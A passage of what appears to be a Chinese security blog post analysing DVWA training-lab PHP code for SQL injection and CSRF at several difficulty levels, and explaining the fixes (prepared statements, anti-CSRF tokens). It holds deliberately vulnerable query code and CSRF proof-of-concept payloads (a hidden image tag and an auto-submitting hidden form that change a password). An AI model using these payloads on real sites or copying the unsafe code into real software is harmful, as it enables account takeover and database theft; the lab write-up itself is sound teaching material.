/&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count </span></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在这个例子中，是最low安全等级的php代码编写样例，可以看到，代码中并没有对用户输入的id变量进行检查和过滤，同时使用的是<code>$_REQUEST</code>全局数组的方式，如果不是特别需要，我们编程的时候尽量不要使用<code>$_REQUEST</code>获取用户的参数，因为<code>$_REQUEST</code>的参数比较杂，包括<code>$_GET</code>,<code>$_POST</code>，<code>$_COOKIE</code>等超全局变量，并且二者还存在变量获取顺序的不一致，受配置文件中<code>variables_order</code>的约定，在存在waf的环境下，容易造成绕过，具体可以参看之前写的文章——<a href="http://lypto.me/2018/01/25/CTF/" target="_blank" rel="noopener">CTF（第三条tips）</a>。未经处理的用户输入直接与sql语句拼接交互，造成sql注入漏洞，十分危险。</p>
+<ul>
+<li>Medium level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_POST[ <span class="string">'id'</span> ]; </span><br><span class="line">    $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; </span><br><span class="line">        <span class="comment">// Display values </span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count </span></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close(); </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>这个版本的代码，与之前的相比只是多了个<code>mysql_real_escape_string</code>函数的过滤，但是要知道这里的$id在sql语句中是数字类型，这样<code>mysql_real_escape_string</code>的转义就会形同虚设，注入仍旧是一马平川。当然不恰当的字符编码，可能会造成宽字节注入，详细可以看之前的文章——<a href="http://lypto.me/2017/11/23/SQL%E6%8D%A3%E9%BC%93/" target="_blank" rel="noopener">sql注入捣鼓</a></p>
+<ul>
+<li>High leval<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_SESSION[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database </span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results </span></span><br><span class="line">    $num = mysql_numrows( $result ); </span><br><span class="line">    $i   = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">while</span>( $i &lt; $num ) &#123; </span><br><span class="line">        <span class="comment">// Get values </span></span><br><span class="line">        $first = mysql_result( $result, $i, <span class="string">"first_name"</span> ); </span><br><span class="line">        $last  = mysql_result( $result, $i, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count </span></span><br><span class="line">        $i++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>在高级版本中只是把注入点隐匿在了<code>$_SESSION</code>全局变量里面,而session中的id值的注册是通过用户输入$_POST全局变量传入，所以是完全可控的，这样一来，就和之前的注入没有什么不一样。这段代码是要提醒我们对于session，只要注册值是用户可控的，也是可能存在sql注入的风险的。另外需要注意到的是，在这个High级别的注入中，回显和传参页面不是同一个，是一个二阶注入，如果使用工具注入，如sqlmap，别忘了加上自定义回显<code>--second-order</code>参数。</p>
+<ul>
+<li>Impossible level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered? </span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123; </span><br><span class="line">        <span class="comment">// Check the database </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">        $row = $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned </span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123; </span><br><span class="line">            <span class="comment">// Get values </span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ]; </span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ]; </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>根据DVWA的说法，这样写出来的应用，是不存在sql注入的。也即这是个十分安全的php代码编写规范。why?首先，我们可以看到它使用Anti-CSRF token的方法来避免csrf攻击（具体细节会在下文csrf防御谈到），然后在sql语句的编写中，使用的是预处理语句，所谓的预处理就是通过php的pdo预处理机制<code>PDO::prepare</code>，先往数据库送出语句模板，进行解析,编译，然后第二次向数据库传入查询参数，在第二次的查询过程中可以理解为不再进行语义解析，所以即使传入sql语句，也会因为不进行语义解析而失效。所以这是一种比较推荐的数据库交互sql语句编写规范。现在很多主流的数据库已经支持预处理，即使不支持，PHP的PDO也会进行预处理模拟实现，这样对于程序员接口一致，不需了解不同数据库对预处理支持的方式差异。  </p>
+<p><br><br>更多PDO细节可以参考官网：<a href="http://php.net/manual/zh/pdo.prepared-statements.php。" target="_blank" rel="noopener">http://php.net/manual/zh/pdo.prepared-statements.php。</a><br><br><br><br><br>参数bind的细节可以查看：<a href="http://php.net/manual/zh/pdo.constants.php。" target="_blank" rel="noopener">http://php.net/manual/zh/pdo.constants.php。</a><br><br></p>
+<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>(完整的攻击过程，可以看这篇前辈的文章：<a href="http://www.freebuf.com/articles/web/118352.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/118352.html</a>)</p>
+<ul>
+<li>Low level</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match? </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>所谓的CSRF（Cross-site request forgery）直白的翻译就是跨站点请求伪造。说人话就是攻击者通过诱使victim访问其精心构造的url或者访问其精心构造的页面，来使得攻击者可以以victim的身份做诸如发邮件，发消息，改密码等骚操作。在DVWA这个系列里面，模拟的是修改密码的界面。先来看下low等级的代码，可以说是没有进行仍和的再认证，试下为啥是“再认证”？其实我们在访问到这个修改密码界面的时候，已经登陆过一次，服务器会在每次访问时检查session。所以这是第一道认证。但是这种会话级别的认证对csrf是没有抵抗力的。具体的过程可以参看之前提到的链接。我们可以直接构造url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</span><br></pre></td></tr></table></figure></p>
+<p>让victim访问，或者使用更加隐匿的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">   form&#123;</span><br><span class="line">    display:none;</span><br><span class="line">   &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
+<p>构造无迹表单,结合js发送请求，或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br></pre></td></tr></table></figure></p>
+<p>来实现欺骗隐匿行踪，达到修改密码的目的。顺便盗用两个别人的poc方便展示：</p>
+<p>(1) 图片形式诱导<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;404&lt;h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;file not found.&lt;h2&gt;</span><br></pre></td></tr></table></figure></p>
+<p>(2) 隐藏表单的形式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  &lt;body onload=&quot;javascript:csrf()&quot;&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">   function csrf()&#123;</span><br><span class="line">    document.getElementById(&quot;button&quot;).click();</span><br><span class="line">   &#125;</span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">   &lt;style&gt;</span><br><span class="line">   form&#123;</span><br><span class="line">    display:none;</span><br><span class="line">   &#125;</span><br><span class="line">   &lt;/style&gt;</span><br><span class="line">        &lt;form action=&quot;http://www.dvwa.com/vulnerabilities/csrf/?&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">            New password:&lt;br /&gt;</span><br><span class="line">            &lt;input type=&quot;password&quot; AUTOCOMPLETE=&quot;off&quot; name=&quot;password_new&quot; value=&quot;test&quot;&gt;&lt;br /&gt;</span><br><span class="line">            Confirm new password:&lt;br /&gt;</span><br><span class="line">            &lt;input type=&quot;password&quot; AUTOCOMPLETE=&quot;off&quot; name=&quot;password_conf&quot; value=&quot;test&quot;&gt;&lt;br /&gt;</span><br><span class="line">            &lt;br /&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; id=&quot;button&quot; name=&quot;Change&quot; value=&quot;Change&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Medium level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Checks to see where the request came from </span></span><br><span class="line">    <span class="keyword">if</span>( eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ) ) &#123; </span><br><span class="line">        <span class="comment">// Get input </span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            <span class="comment">// They do! </span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">            $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database </span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Issue with passwords matching </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Didn't come from a trusted source </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>在这个级别的CSRF漏洞中，服务端多了一句<code>eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ]</code>校验，<code>ereg()</code>函数是模式匹配，通过超全局数组获取了请求头referer值（也就是访问者向host发起请求时所在的页面）和host值，并且检查host的值是否在referer中出现。根据权威(<a href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)，这两个值无法以编程的方式修改，抓包除外，因为在csrf中无法通过抓取客户端的包进行修改，所以按理来说是安全的。实则不然，通过公网服务器，诱使victim访问名字包含host的html文件就可以实现绕过。" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)，这两个值无法以编程的方式修改，抓包除外，因为在csrf中无法通过抓取客户端的包进行修改，所以按理来说是安全的。实则不然，通过公网服务器，诱使victim访问名字包含host的html文件就可以实现绕过。</a></p>
+<ul>
+<li>High level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match? </span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database </span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>; </span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Issue with passwords matching </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>在高级别中的代码，主要是使用了Anti-csrf机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。我们可以按F12来看看这个token:<br><img src="/myimages/php/1.jpg" alt="image"></p>
+<p>可以看到不同的用户会返回一个不同的token，这个token在hidden栏里面,这样一来，迫于同源策略，攻击者无法获取victim的token，也就无法实现CSRF攻击。但是真的无法实现吗？配合xss我们还是可以盗取token的，但是这难度无疑增大，我们必须要有服务器的一个xss漏洞来盗取token，然后再使用CSRF。攻击成本也增大。</p>
+<ul>
+<li>Impossible level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_curr = $_GET[ <span class="string">'password_current'</span> ]; </span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input </span></span><br><span class="line">    $pass_curr = stripslashes( $pass_curr ); </span><br><span class="line">    $pass_curr = mysql_real_escape_string( $pass_curr ); </span><br><span class="line">    $pass_curr = md5( $pass_curr ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':password'</span>, $pass_curr, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user? </span></span><br><span class="line">    <span class="keyword">if</span>( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// It does! </span></span><br><span class="line">        $pass_new = stripslashes( $pass_new ); </span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">        $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':password'</span>, $pass_new, 